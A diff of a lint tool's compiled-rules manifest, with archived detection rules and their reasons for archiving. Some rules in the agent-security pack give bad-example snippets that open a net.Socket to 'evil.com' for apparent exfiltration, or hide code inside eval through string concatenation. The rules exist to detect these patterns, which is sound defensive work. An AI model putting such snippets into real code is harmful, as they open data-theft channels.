@@ -7009,67 +7009,243 @@
     {
       "lessonHash": "600edf2e1c782b77",
       "lessonHeading": "Initialize manifests with schema wrappers",
+      "pattern": "",
       "message": "Initialize rule manifests as '{ \"version\": 1, \"rules\": [] }' instead of a bare array for schema-aware loader compatibility.",
       "engine": "ast-grep",
-      "severity": "warning",
-      "pattern": "",
       "astGrepPattern": "const $VAR = []",
+      "badExample": "const manifest = [];",
       "compiledAt": "2026-04-17T17:41:50.379Z",
       "createdAt": "2026-04-17T17:41:50.379Z",
       "fileGlobs": [
         "packages/pack-agent-security/**/*.ts",
         "packages/pack-agent-security/**/*.js"
       ],
-      "badExample": "const manifest = [];",
+      "severity": "warning",
       "status": "archived",
       "archivedReason": "Over-broad: astGrepPattern `const $VAR = []` fires on every empty-array declaration in packages/pack-agent-security/**, not only on manifest initializers. Cannot distinguish \"const manifest = []\" (the intended target) from \"const violations = []\" or any other transient empty-array. Same failure mode as the dynamic-import rules archived under #1517."
     },
     {
       "lessonHash": "28cc46c09bd5820f",
       "lessonHeading": "Allow null branches for detached HEADs",
+      "pattern": "currentBranch:\\s*['\"][^'\"]+['\"]",
       "message": "currentBranch must allow null (string | null) to handle detached HEAD states in CI. Do not hardcode a non-null branch string in test fixtures.",
       "engine": "regex",
-      "severity": "warning",
-      "pattern": "currentBranch:\\s*['\"][^'\"]+['\"]",
+      "badExample": "const gitState = { currentBranch: 'main', commits: [] };",
       "compiledAt": "2026-04-17T17:41:49.160Z",
       "createdAt": "2026-04-17T17:41:49.160Z",
       "fileGlobs": [
         "packages/mcp/src/**/*.test.ts",
         "packages/mcp/src/**/*.test.tsx"
       ],
-      "badExample": "const gitState = { currentBranch: 'main', commits: [] };"
+      "severity": "warning"
     },
     {
       "lessonHash": "854ee1ad7fe80c40",
       "lessonHeading": "Claude Opus 4.7 rejects sampling parameters",
+      "pattern": "",
       "message": "Claude Opus 4.7 rejects temperature, top_p, and top_k sampling parameters — strip them before calling the Messages API",
       "engine": "ast-grep",
-      "severity": "warning",
-      "pattern": "",
       "astGrepPattern": "client.messages.create({ $$$ARGS, temperature: $VAL, $$$REST })",
+      "badExample": "client.messages.create({ model: 'claude-opus-4-7', temperature: 0.7, messages: [] });",
       "compiledAt": "2026-04-17T17:42:07.419Z",
       "createdAt": "2026-04-17T17:42:07.419Z",
       "fileGlobs": [
         "packages/cli/**/*.ts"
       ],
-      "badExample": "client.messages.create({ model: 'claude-opus-4-7', temperature: 0.7, messages: [] });",
+      "severity": "warning",
       "status": "archived",
       "archivedReason": "Incomplete pattern (CodeRabbit finding on #1520): astGrepPattern `client.messages.create({ $$$ARGS, temperature: $VAL, $$$REST })` matches only calls that pass temperature, but the rule message says Opus 4.7 rejects all three of temperature, top_p, and top_k. Calls passing only top_p or top_k slip through. Archived rather than shipped incomplete; full coverage requires a compound rule authored in the source lesson."
     },
     {
-      "lessonHash": "263c3b88dc975aa3",
-      "lessonHeading": "Pipeline 5: observation from shield",
-      "pattern": "badExample:\\s+parsed\\.badExample\\s+\\?\\?\\s+'\\(no\\s+badExample\\s+emitted\\)',",
-      "message": "When retrying due to an Example Hit/Miss verification failure, the `badExample` passed to `previousFailure` is still `parsed.badExample` (the smoke gate snippet, which the pattern successfully matched). The retry directive prompt says '**Code snippet the pattern had to match:**' followed by this smoke gate snippet, which might slightly confuse the LLM since the actual failure was on the Example Hit snippet (detailed in the `Failure reason`). Consider passing the actual failed Example Hit snippet if the failure originated from `verifyRuleExamples`.",
+      "lessonHash": "523b9893cb454e70",
+      "lessonHeading": "Use boundary-guard anchors for domain blocklists",
+      "pattern": "\\(\\?:(?:\\^|\\\\\\.)\\|(?:\\^|\\\\\\.)",
+      "message": "Use boundary-guard anchors like `[^\\w-]` instead of `(?:^|\\.)` for domain blocklists to prevent partial matches against sibling domains (e.g., 'not-evil.com' matching 'evil.com')",
       "engine": "regex",
-      "severity": "warning",
+      "badExample": "const domainRegex = /(?:^|\\.)evil\\.com$/;",
+      "compiledAt": "2026-04-18T04:56:06.488Z",
+      "createdAt": "2026-04-18T04:56:06.488Z",
       "fileGlobs": [
-        "**/*.ts"
+        "packages/pack-agent-security/test/**/*.ts"
       ],
-      "compiledAt": "2026-04-17T04:17:14.891Z",
-      "createdAt": "2026-04-17T04:17:14.891Z",
+      "severity": "warning",
       "status": "archived",
-      "archivedReason": "Orphan: no source lesson file exists in .totem/lessons/ for this hash. The rule was compiled at 2026-04-17T04:17:14.891Z but the parent manifest on main was generated at 2026-04-17T02:45:44 (off-by-one drift: manifest rule_count 425 vs actual 426). totem lesson compile drain step caught the orphan during #1517 refresh. Preserved in archived state for hash telemetry continuity per project convention; cannot be recompiled without re-authoring the lesson."
+      "archivedReason": "Pattern matches the literal regex-author text for a boundary anchor in source/docs — meta-advice to rule authors, not an enforcement rule on consumer code. Would fire on strategy docs, compiler corpus, and any regex authoring discussion without identifying a real defect."
+    },
+    {
+      "lessonHash": "4c219e8ad6230689",
+      "lessonHeading": "Include low-level network primitives in exfil rules",
+      "pattern": "",
+      "message": "Low-level net.Socket usage must be reviewed for potential data exfiltration. Ensure this is covered by exfil detection rules.",
+      "engine": "ast-grep",
+      "astGrepPattern": "new net.Socket($$$ARGS)",
+      "badExample": "const sock = new net.Socket(); sock.connect(4444, 'evil.com');",
+      "compiledAt": "2026-04-18T04:56:06.290Z",
+      "createdAt": "2026-04-18T04:56:06.290Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/**/*.ts",
+        "packages/pack-agent-security/**/*.js"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern fires on every legitimate net.Socket construction. The source lesson is authorial guidance about what to include when writing exfil detection rules — it is not a signal that consumer code using net.Socket is suspicious."
+    },
+    {
+      "lessonHash": "a37823bcf1e849b5",
+      "lessonHeading": "Include path context in walkDir errors",
+      "pattern": "",
+      "message": "Filesystem traversal error handlers must rethrow with path context — never swallow errors or use empty catch blocks. Include the directory or file path in the rethrown error.",
+      "engine": "ast-grep",
+      "astGrepYamlRule": {
+        "rule": {
+          "kind": "catch_clause",
+          "not": {
+            "has": {
+              "kind": "throw_statement",
+              "stopBy": "end"
+            }
+          }
+        }
+      },
+      "badExample": "try {\n  await walkDir(dir, callback);\n} catch (err) {\n  console.error(err);\n}",
+      "compiledAt": "2026-04-18T04:56:10.082Z",
+      "createdAt": "2026-04-18T04:56:10.082Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/test/**/*.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern matches every catch_clause without a throw_statement. The source lesson targets walkDir-specific error handling, but the compiled rule fires on all empty or non-rethrowing catches across the codebase. Overlaps with the existing empty-catch detection shipped in 1.13.0 (#664)."
+    },
+    {
+      "lessonHash": "ec8e329a673cf601",
+      "lessonHeading": "Cover all dynamic evaluation constructors",
+      "pattern": "",
+      "message": "Dynamic code execution via Function() constructor is forbidden — both 'new Function()' and bare 'Function()' calls facilitate arbitrary code execution.",
+      "engine": "ast-grep",
+      "astGrepPattern": "Function($$$ARGS)",
+      "badExample": "const fn = Function('return 1 + 1');",
+      "compiledAt": "2026-04-18T04:56:19.507Z",
+      "createdAt": "2026-04-18T04:56:19.507Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/test/**/*.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern fires on every reference to the Function constructor, including legitimate type references and re-exports. The pack-agent-security rule a0b737fd43fb943e already covers dynamic code-eval constructors with proper context gating (literal-string filter, unconditional fire on Function/vm primitives)."
+    },
+    {
+      "lessonHash": "a24ec7272f1f670e",
+      "lessonHeading": "Handle detached HEAD states in tests",
+      "pattern": "currentBranch:\\s*[\"'][^\"']+[\"']",
+      "message": "Test fixtures must allow currentBranch to be null to handle detached HEAD states in CI. Use null instead of a hardcoded branch string.",
+      "engine": "regex",
+      "badExample": "const fixture = { currentBranch: \"main\", commits: [] };",
+      "compiledAt": "2026-04-18T04:56:24.495Z",
+      "createdAt": "2026-04-18T04:56:24.495Z",
+      "fileGlobs": [
+        "packages/mcp/src/**/*.test.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern fires globally on any occurrence of currentBranch with a string literal value. The source lesson is about test-fixture null-handling for detached-HEAD coverage, but the rule has no way to scope to tests only and would over-fire on production git-state code."
+    },
+    {
+      "lessonHash": "5a746a435d763ca6",
+      "lessonHeading": "Use explicit monorepo test globs",
+      "pattern": "\"![*][*]/test/",
+      "message": "Avoid broad exclusion globs like `!**/test/**` in monorepo security rules. Use explicit patterns like `!packages/**/test/**` to prevent inadvertently linting consumer test trees.",
+      "engine": "regex",
+      "badExample": "\"!**/test/**\"",
+      "compiledAt": "2026-04-18T04:56:20.098Z",
+      "createdAt": "2026-04-18T04:56:20.098Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/compiled-rules.json"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern matches a broad exclude glob literally. The source lesson recommends preferring more explicit forms, which is authorial guidance — the compiled rule would flag legitimate uses of the broader glob across unrelated config files without identifying a real defect."
+    },
+    {
+      "lessonHash": "c0f652d54da5bed0",
+      "lessonHeading": "Prevent eval bypasses via concatenation",
+      "pattern": "",
+      "message": "eval() argument must be a single string literal — concatenation or template interpolation can bypass security rules",
+      "engine": "ast-grep",
+      "astGrepYamlRule": {
+        "rule": {
+          "pattern": "eval($ARG)",
+          "has": {
+            "any": [
+              {
+                "kind": "binary_expression"
+              },
+              {
+                "kind": "template_string"
+              }
+            ],
+            "stopBy": "end"
+          }
+        }
+      },
+      "badExample": "eval('console' + '.log(secret)');",
+      "compiledAt": "2026-04-18T04:56:46.229Z",
+      "createdAt": "2026-04-18T04:56:46.229Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/test/**/*.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern duplicates the dynamic-code-evaluation coverage in pack-agent-security rule a0b737fd43fb943e, which handles the same non-literal-argument case via its own constraint. Retaining both would double-fire on the same site."
+    },
+    {
+      "lessonHash": "fc2d6c1f6e298d28",
+      "lessonHeading": "Include low-level socket APIs in network rules",
+      "pattern": "",
+      "message": "Security network rules must cover low-level socket APIs (net.Socket, net.Socket.connect) to prevent exfiltration bypasses",
+      "engine": "ast-grep",
+      "astGrepPattern": "new net.Socket()",
+      "badExample": "const s = new net.Socket(); s.connect(80, 'evil.com');",
+      "compiledAt": "2026-04-18T04:56:49.086Z",
+      "createdAt": "2026-04-18T04:56:49.086Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/test/**/*.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern duplicates the semantic of 4c219e8ad6230689 (same lesson extracted twice with slightly different patterns). Same over-fire concern: flags every legitimate net.Socket construction."
+    },
+    {
+      "lessonHash": "de7ee11b427d201e",
+      "lessonHeading": "Allow null branches for detached HEADs",
+      "pattern": "currentBranch:\\s*'[^']*'",
+      "message": "Git state mocks must allow currentBranch to be null (for detached HEAD / CI environments). Use currentBranch: null or type it as string | null.",
+      "engine": "regex",
+      "badExample": "const mockGitState = { currentBranch: 'main', commits: [] };",
+      "compiledAt": "2026-04-18T04:57:05.329Z",
+      "createdAt": "2026-04-18T04:57:05.329Z",
+      "fileGlobs": [
+        "packages/mcp/src/**/*.test.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern is a single-quote-only variant of a24ec7272f1f670e. Same over-fire concern across production code; same authorial-guidance scope mismatch."
+    },
+    {
+      "lessonHash": "aeb65ba1a27ec781",
+      "lessonHeading": "Use field scoping for argument validation",
+      "pattern": "has:\\s*\\{[^}]*pattern\\s*:",
+      "message": "Use field scoping (e.g., 'arguments.0') instead of 'has' with pattern to prevent bypass via mixed expressions in ast-grep rules",
+      "engine": "regex",
+      "badExample": "const rule = { has: { pattern: 'eval($ARG)' } };",
+      "compiledAt": "2026-04-18T04:59:28.136Z",
+      "createdAt": "2026-04-18T04:59:28.136Z",
+      "fileGlobs": [
+        "packages/pack-agent-security/test/**/*.ts"
+      ],
+      "severity": "warning",
+      "status": "archived",
+      "archivedReason": "Pattern fires on any YAML snippet containing `has:` with `pattern:`, which is the standard ast-grep rule-definition syntax. Would flag every shipped rule spec in .totem/compiled-rules.json, .totem/lessons/, strategy docs, and every ast-grep rule authored downstream. Pure authorial guidance, not enforcement."
     }
   ],
   "nonCompilable": [
@@ -10728,6 +10904,98 @@
     {
       "hash": "8d5871f196c04d2e",
       "title": "Account for Opus 4.7 tokenization overhead"
+    },
+    {
+      "hash": "f03d535956f457bc",
+      "title": "Validate member expressions in security rules"
+    },
+    {
+      "hash": "708cd0890981c066",
+      "title": "Strengthen security allowlist drift guards"
+    },
+    {
+      "hash": "f4893f2ed81cd13a",
+      "title": "Archive rules in-place to preserve telemetry"
+    },
+    {
+      "hash": "33a3f8f3f3b68b42",
+      "title": "Prefer no sensor over partial coverage"
+    },
+    {
+      "hash": "0c568bb747788e3d",
+      "title": "Match both quote styles in AST string arguments"
+    },
+    {
+      "hash": "43782f9fcb98de23",
+      "title": "Avoid over-broad empty array declarations"
+    },
+    {
+      "hash": "7490b69ec78966cb",
+      "title": "Assert per-family coverage for compound rules"
+    },
+    {
+      "hash": "4c5bebf059e96958",
+      "title": "Cover bare and constructor calls"
+    },
+    {
+      "hash": "2436967eaaadd102",
+      "title": "Limit manual edits to lifecycle changes"
+    },
+    {
+      "hash": "2f6904340cec6ba5",
+      "title": "Avoid generic empty-array AST-grep patterns"
+    },
+    {
+      "hash": "a3a3ef29c0260e0c",
+      "title": "Explicitly exclude nested monorepo test paths"
+    },
+    {
+      "hash": "b6ef77c7536e28e2",
+      "title": "Prefer archiving over shipping partial coverage"
+    },
+    {
+      "hash": "1eda246f6b919235",
+      "title": "Restrict manual edits to lifecycle changes"
+    },
+    {
+      "hash": "bfed92d44ad06697",
+      "title": "Strictly anchor IP and domain regexes"
+    },
+    {
+      "hash": "d1209357be538cfc",
+      "title": "Prioritize data-only architecture for security packs"
+    },
+    {
+      "hash": "018651feb1819882",
+      "title": "Isolate monorepo-specific security allowlists"
+    },
+    {
+      "hash": "8f7c5a71550ea8fa",
+      "title": "Archive flawed rules to preserve telemetry"
+    },
+    {
+      "hash": "07a7faff1954088b",
+      "title": "Track line numbers in security allowlists"
+    },
+    {
+      "hash": "7d5a720f43564dbc",
+      "title": "Lazy-load CLI commands per ADR-072"
+    },
+    {
+      "hash": "908eaa0cd34bbfde",
+      "title": "Assert per-family coverage for compound rules"
+    },
+    {
+      "hash": "09cd44c9e0bc1275",
+      "title": "Refine security rules at the source definition"
+    },
+    {
+      "hash": "9fb5a6f39ef7c637",
+      "title": "Include both quote styles in AST patterns"
+    },
+    {
+      "hash": "d56da3507a34a382",
+      "title": "Prefer field scoping in ast-grep"
     }
   ]
 }
